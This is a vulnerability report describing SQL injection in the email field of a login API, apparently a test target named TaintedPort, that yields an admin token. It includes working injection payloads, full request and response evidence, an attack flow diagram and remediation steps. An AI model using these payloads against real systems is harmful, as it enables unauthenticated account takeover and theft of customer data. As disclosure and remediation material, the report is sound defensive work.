# Authentication Bypass via SQL Injection in POST /auth/login `email` Parameter (Unauthenticated Admin Takeover)

**ID:** vuln-0012
**Severity:** CRITICAL
**Found:** 2026-07-20 11:52:06 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /auth/login
**Method:** POST
**CWE:** CWE-89
**CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

## Description

The `POST /auth/login` endpoint of the TaintedPort API concatenates the JSON `email` value directly into the SQL query used for credential lookup. An unauthenticated attacker can inject a boolean tautology terminated by an SQL line comment (`--`) to (a) force the credential-lookup query to return an arbitrary user row and (b) neutralise the trailing password-hash check by making it part of the commented-out portion of the statement. Because the server treats a successful row retrieval as successful authentication and immediately mints an HS256-signed JWT for the returned user, this SQL injection is a direct authentication bypass. By tuning the predicate to `... OR email LIKE 'admin%'--` (or `... OR is_admin=1--`), the attacker selects the administrator row and obtains an admin JWT that is honoured by the server-side authorisation layer on every `/admin/*` route.

## Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│                 Unauthenticated SQLi → Admin Takeover                │
│                    POST /auth/login  (email field)                   │
└──────────────────────────────────────────────────────────────────────┘

Prerequisites
─────────────
  • Network reachability to api.taintedport.com (public internet)
  • No credentials, no session, no CSRF token, no user interaction

┌──────────────┐        ┌─────────────────────────────────────────┐
│              │  (1)   │  POST /auth/login                       │
│  Attacker    │ ─────► │  {"email":"zzz' OR email LIKE 'admin%'--"│
│  (no auth)   │        │   ,"password":"anything"}               │
│              │        └────────────────────┬────────────────────┘
└──────────────┘                             │
                                             ▼
                        ┌───────────────────────────────────────────┐
                        │  PHP login handler (root cause)           │
                        │                                           │
                        │  $sql = "SELECT id,name,email,            │
                        │       password_hash,is_admin              │
                        │       FROM users WHERE email='" .         │
                        │       $email . "' AND password_hash='..'";│
                        │           ▲                               │
                        │           │  raw string concatenation     │
                        │           │  → SQLi                       │
                        └───────────┼───────────────────────────────┘
                                    │
                                    ▼
                        ┌───────────────────────────────────────────┐
                        │  SQLite 3.51.2 executes:                  │
                        │    SELECT ... FROM users                  │
                        │     WHERE email='zzz' OR email LIKE       │
                        │           'admin%'-- ' AND password_hash= │
                        │                                           │
                        │  '--' comments out the password check.    │
                        │  Row returned: administrator (user_id=3). │
                        └────────────────────┬──────────────────────┘
                                             │
                                             ▼
                        ┌───────────────────────────────────────────┐
                        │  Handler treats row as authenticated user │
                        │  and mints HS256 JWT:                     │
                        │    {"user_id":3,                          │
                        │     "email":"admin@example.com",          │
                        │     "is_admin":true,                      │
                        │     "iat":..., "exp":<+7 days>}           │
                        └────────────────────┬──────────────────────┘
                                             │
                                (2) HTTP 200 │ + admin JWT
                                             ▼
┌──────────────┐        ┌─────────────────────────────────────────┐
│  Attacker    │ ◄──────│  {"success":true,"token":"<admin JWT>", │
│  now holds   │        │   "user":{"id":3,"is_admin":true,...}}  │
│  admin JWT   │        └─────────────────────────────────────────┘
└──────┬───────┘
       │
       │ (3) GET /admin/orders   Authorization: Bearer <admin JWT>
       ▼
┌─────────────────────────────────────────────────────────────────┐
│  Server-side authorisation trusts the JWT's is_admin=true claim │
│  → HTTP 200 { "orders": [ ... 140+ orders with PII ... ] }      │
│                                                                 │
│  Every /admin/* route is now reachable: order management,       │
│  status changes, customer data access, etc.                     │
└─────────────────────────────────────────────────────────────────┘

Root Cause Summary
──────────────────
  Login handler interpolates the user-supplied `email` field into a raw SQL
  string; SQLite honours `--` as a line comment, so the injected payload
  eliminates the AND-clause that checks the password hash. The application
  has no defence-in-depth password_verify() gate in code — successful row
  retrieval alone is treated as successful authentication, so the SQLi is a
  direct, unauthenticated authentication bypass with full admin scope.
```

## Impact

A completely unauthenticated network attacker takes over the administrator account with a single HTTP request. The returned JWT is a legitimate 7-day HS256 token carrying `is_admin:true` and is accepted by downstream server-side authorisation checks (verified against `GET /admin/orders`, which returns all customer orders and PII to admins only). The same primitive lets the attacker log in as any user by tweaking the predicate. Because exploitation requires no session, no CSRF token, no user interaction, and no prior knowledge of a valid account, the vulnerability is directly and remotely exploitable at internet scale. Combined with the separately-reported UNION-based SQLi in `/wines/{id}`, every bcrypt password hash and TOTP secret in the `users` table is also extractable, enabling offline password cracking and permanent multi-factor bypass.

## Technical Analysis

The login handler builds the credential-lookup query by string-concatenating the JSON `email` value into a SQL statement whose effective shape is:

    SELECT id, name, email, password_hash, is_admin FROM users
     WHERE email = '<INPUT>' AND password_hash = '<hashed_or_literal_pw>'

Injecting `x' OR 'a'='a'--` produces:

    ... WHERE email = 'x' OR 'a'='a'--' AND password_hash = '...'

The `--` line comment discards the entire `AND password_hash = ...` clause. SQLite (fingerprinted as 3.51.2 via a companion UNION SQLi on the same host) evaluates the remaining predicate as always-true and returns every row; the application consumes the first row and treats it as an authenticated user, issuing a signed JWT with that user's `id`, `email`, and `is_admin` claims. Refining the predicate to `zzz' OR email LIKE 'admin%'--` (or `x' OR is_admin=1--`) restricts the result set to the administrator row, so the JWT is minted for the admin account. The decoded JWT payload confirms `{"user_id":3, "email":"admin@example.com", "is_admin":true}` and the token is accepted by `GET /admin/orders` (HTTP 200 with 140+ orders returned), proving that the server-side authorisation layer trusts the `is_admin` claim in the injected token.

Root cause: raw string interpolation of the `email` parameter into a SQL statement handled by SQLite (which accepts `--` as a valid line comment). The bug is in the server-side query construction, not in the JWT signing or the client. Crucially, there is no separate `password_verify()` gate in application code — the password check exists only inside the injectable SQL. Consequently, the SQLi is a direct authentication bypass rather than merely a data-disclosure primitive.

Backend fingerprint: SQLite 3.51.2, PHP 8.2.31 (`X-Powered-By: PHP/8.2.31`).

## Proof of Concept

Reproduction (fully unauthenticated, no prior state):

1. Control — confirm the endpoint rejects invalid credentials:
   `POST /auth/login` body `{"email":"noexist-validator@example.com","password":"definitely-wrong-password"}`
   → HTTP 401, `{"success":false,"message":"Login failed …"}`.

2. Tautology bypass — authenticate as an arbitrary user without a password:
   `POST /auth/login` body `{"email":"anything' OR 'a'='a'-- ","password":"nomatter"}`
   → HTTP 200, `{"success":true,"token":"<JWT>","user":{"id":1,"name":"Luis Grangeia","email":"joe@example.com","is_admin":false}}`.

3. Admin targeting — restrict the injected predicate to admin rows:
   `POST /auth/login` body `{"email":"zzz' OR email LIKE 'admin%'-- ","password":"irrelevant"}`
   → HTTP 200, JWT claims decode to `{"user_id":3,"email":"admin@example.com","is_admin":true,…}`.

4. Authority verification — use the admin JWT against an admin-only route:
   `GET /admin/orders` with header `Authorization: Bearer <JWT from step 3>`
   → HTTP 200, `{"success":true,"orders":[…]}`. The server treats the injected JWT as fully privileged.

The reproduction is fully automated in `poc/poc.py` (executes all four steps and asserts each). A minimal regression test is provided in `poc/verify.py` — exits 0 if still vulnerable, 1 if fixed.

```
See poc_script_path.
```

## Evidence

### 1. Control — plausible email, wrong password → 401

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"noexist-validator@example.com","password":"definitely-wrong-password"}
```

**Response:**
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Login failed for noexist-validator@example.com. Please check your credentials."}
```

> Baseline confirms that valid-shaped but incorrect credentials are rejected. Only injected SQL in the email field triggers the bypass.

### 2. Tautology auth bypass — SQLi in email → 200 + JWT for first user row

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"anything' OR 'a'='a'-- ","password":"nomatter"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjpmYWxzZSwiaWF0IjoxNzg0NTQ4MjE1LCJleHAiOjE3ODUxNTMwMTV9.<sig>","user":{"id":1,"name":"Luis Grangeia","email":"joe@example.com","is_admin":false}}
```

> SQL comment '--' swallows the trailing password-hash check. The server issues a valid HS256 JWT (7-day lifetime) for the first row of the users table, proving that the password check is exclusively enforced inside the injectable SQL — there is no defence-in-depth password_verify() in code.

### 3. Admin targeting — LIKE-restricted predicate → 200 + admin JWT (is_admin=true)

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"zzz' OR email LIKE 'admin%'-- ","password":"irrelevant"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTc4NDU0ODIxNSwiZXhwIjoxNzg1MTUzMDE1fQ.<sig>","user":{"id":3,"name":"Admin User","email":"admin@example.com","is_admin":true}}
```

> The predicate restricts the returned row to admin users. Decoded JWT payload: {"user_id":3,"email":"admin@example.com","is_admin":true,"iat":...,"exp":...}. No credentials of any kind were supplied.

### 4. Admin JWT authorises admin-only endpoint → 200 with all orders

**Request:**
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <JWT from step 3>
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[{"id":142,"user_id":373,"user_name":"Luis Grangeia","user_email":"luis.grangeia@snyk.io","total":-1500000,"status":"pending","shipping_name":"Validator PoC","shipping_city":"Lisboa","order_date":"2026-07-20 11:46:46","items_count":1}, ... 140+ orders total ...]}
```

> The server-side authorisation layer accepts the injected JWT as fully privileged administrator: /admin/orders (403 for non-admins) returns HTTP 200 with the full order listing, including customer PII and shipping addresses. This proves the SQLi is not merely a data-exposure primitive but a complete authentication bypass with cross-component authority (Scope: Changed).


## Remediation

1. Replace the string-concatenated SQL in the login handler with a prepared statement using bound parameters, e.g.:

       $stmt = $pdo->prepare('SELECT id, name, email, password_hash, is_admin FROM users WHERE email = :email');
       $stmt->execute([':email' => $email]);
       $row  = $stmt->fetch();

   and perform the password check in PHP via `password_verify($password, $row['password_hash'])`, so that no user-controlled data ever reaches the SQL parser and successful authentication requires an explicit hash comparison in application code.

2. Audit every other endpoint that concatenates user input into SQL — see sibling findings for `GET /wines/{id}` (UNION SQLi) and `GET /wines?search` (blind boolean SQLi). The same code style is likely repeated.

3. Introduce a repository/DAO layer that only exposes parameterised methods; ban ad-hoc string SQL in code review and enforce via a linter.

4. Rotate the HS256 signing secret so that any JWTs minted while the endpoint was exploitable are immediately invalidated. Consider migrating to short-lived tokens plus refresh tokens.

5. Force a password reset and TOTP re-enrollment for every account, since password hashes and TOTP secrets are also extractable via the sibling `/wines/{id}` UNION SQLi finding.

6. Add a WAF/CDN rule flagging obvious SQL metacharacters in authentication payloads as a compensating control, but not as a replacement for parameterisation.

7. Add integration tests that assert `POST /auth/login` with `{"email":"x' OR 1=1--","password":"x"}` and `{"email":"zzz' OR email LIKE 'admin%'--","password":"x"}` return HTTP 401 and do not issue a token.

## Conditions for Severity Increase

Severity is already at the ceiling (CVSS 10.0 Critical) — no external condition is required to raise it. However, exploitation potency increases when combined with the sibling UNION-based SQLi in `GET /wines/{id}`: that primitive exposes bcrypt password hashes and TOTP secrets from the `users` table, enabling permanent account compromise even after the login SQLi is patched and JWT signing keys are rotated. If a fix rotates the JWT secret but does not force a password/TOTP reset, previously-exfiltrated hashes remain valuable.
